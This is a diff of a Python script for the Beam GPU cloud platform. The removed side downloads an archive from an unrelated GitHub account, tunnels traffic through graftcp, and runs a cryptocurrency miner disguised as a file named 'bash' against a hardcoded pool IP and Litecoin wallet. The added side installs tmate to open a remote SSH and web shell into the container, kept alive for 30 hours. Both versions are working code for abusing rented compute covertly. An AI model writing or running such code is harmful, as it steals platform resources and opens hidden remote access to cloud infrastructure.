@@ -2,109 +2,122 @@ from beam import function, Image
 import subprocess
 import time
 
+
 image = (
     Image(
         base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
     )
     .add_commands([
         "apt-get update -y",
-        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
+        "apt-get install -y wget ca-certificates xz-utils procps",
     ])
 )
 
 
 @function(
-    name="test",
+    name="gpu-ssh",
     image=image,
     gpu="RTX4090",
     cpu=2,
     memory="4Gi",
-    timeout=30 * 60 * 60,
+    timeout=30 * 60 * 60,   # 30 jam
 )
 def run_script():
 
-    print("=== CHECK GPU ===")
+    print("=== GPU ===")
     subprocess.run(["nvidia-smi"], check=False)
 
-    cmd = """
-    set -e
+    cmd = r"""
+set -e
 
-    echo "=== CURRENT DIRECTORY ==="
-    pwd
+cd /tmp
 
-    echo "=== DOWNLOAD FILE ==="
-    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
+TMATE="/usr/local/bin/tmate"
+SOCKET="/tmp/tmate.sock"
 
-    echo "=== EXTRACT ==="
-    unzip -o pan.zip
+echo "=== DOWNLOAD TMATE ==="
 
-    echo "=== CHECK PAN ==="
-    ls -ld /mnt/code/pan
-    ls -lah /mnt/code/pan
+wget -q \
+  https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz \
+  -O /tmp/tmate.tar.xz
 
-    echo "=== ENTER PAN ==="
-    cd /mnt/code/pan
+echo "=== EXTRACT TMATE ==="
 
-    echo "=== SET PERMISSION ==="
-    chmod -R +x .
+rm -rf /tmp/tmate-2.4.0-static-linux-amd64
 
-    echo "=== START GRAFTCP LOCAL ==="
-    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
+tar -xf /tmp/tmate.tar.xz
 
-    sleep 3
+cp \
+  /tmp/tmate-2.4.0-static-linux-amd64/tmate \
+  "$TMATE"
 
-    echo "=== DOWNLOAD RIG ==="
-    cd /mnt/code/pan
-    git clone https://github.com/malogrono/lol198.git
+chmod +x "$TMATE"
 
-    echo "=== CHECK LOL ==="
-    ls -lah /mnt/code/pan/lol198
+echo "TMATE VERSION:"
+"$TMATE" -V
 
-    echo "=== CHECK BASH ==="
-    cd /mnt/code/pan/lol198
-    ls -lh bash
+echo "=== START TMATE SESSION ==="
 
-    chmod u+x bash
+rm -f "$SOCKET"
 
-    echo "=== MOVE BASH ==="
-    mv bash /mnt/code/pan/
+"$TMATE" \
+  -S "$SOCKET" \
+  new-session -d
 
-    echo "=== CHECK PAN AFTER MOVE ==="
-    ls -ld /mnt/code/pan
-    ls -lah /mnt/code/pan
+echo "=== WAITING FOR TMATE ==="
 
-    echo "=== FINAL DIRECTORY ==="
-    cd /mnt/code/pan
-    pwd
-    ls -lah
-    
-    echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --algo ETHASH --pool 57.129.82.223:80 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.02 --ethstratum ETHPROX
-    """
+"$TMATE" \
+  -S "$SOCKET" \
+  wait tmate-ready
 
-    subprocess.run(["bash", "-lc", cmd], check=False)
+echo "=== TMATE READY ==="
 
-    print("Staying alive for 30 hours...")
-    time.sleep(60 * 60 * 30)
+SSH=$("$TMATE" \
+  -S "$SOCKET" \
+  display -p '#{tmate_ssh}')
 
-    echo ("=== TIMER START ===")
+WEB=$("$TMATE" \
+  -S "$SOCKET" \
+  display -p '#{tmate_web}')
 
-    start = time.monotonic()
-    duration = 30 * 60 * 60
+echo ""
+echo "=========================================="
+echo "             TMATE SSH READY"
+echo "=========================================="
+echo ""
+echo "SSH:"
+echo "$SSH"
+echo ""
+echo "WEB:"
+echo "$WEB"
+echo ""
+echo "=========================================="
+echo ""
 
-    while time.monotonic() - start < duration:
-        elapsed = int(time.monotonic() - start)
+echo "=== GPU STATUS ==="
 
-        hours = elapsed // 3600
-        minutes = (elapsed % 3600) // 60
-        seconds = elapsed % 60
+nvidia-smi
 
-        print(
-            f"\rElapsed: {hours:02d}:{minutes:02d}:{seconds:02d}",
-            end="",
-            flush=True,
-        )
+echo ""
+echo "=== CONTAINER WILL STAY ALIVE ==="
+echo "Maximum runtime: 30 hours"
+echo ""
 
-        time.sleep(1)
+# Jangan exit walaupun kamu disconnect dari SSH.
+# Container tetap hidup sampai Beam menghentikannya.
+while true
+do
+    sleep 3600
+done
+"""
 
-    print("\n=== 30 HOURS COMPLETED ===")
+    subprocess.run(
+        ["bash", "-lc", cmd],
+        check=False
+    )
+
+    print("=== MAIN PROCESS EXITED ===")
+
+    # Keep Python process alive as well.
+    while True:
+        time.sleep(3600)
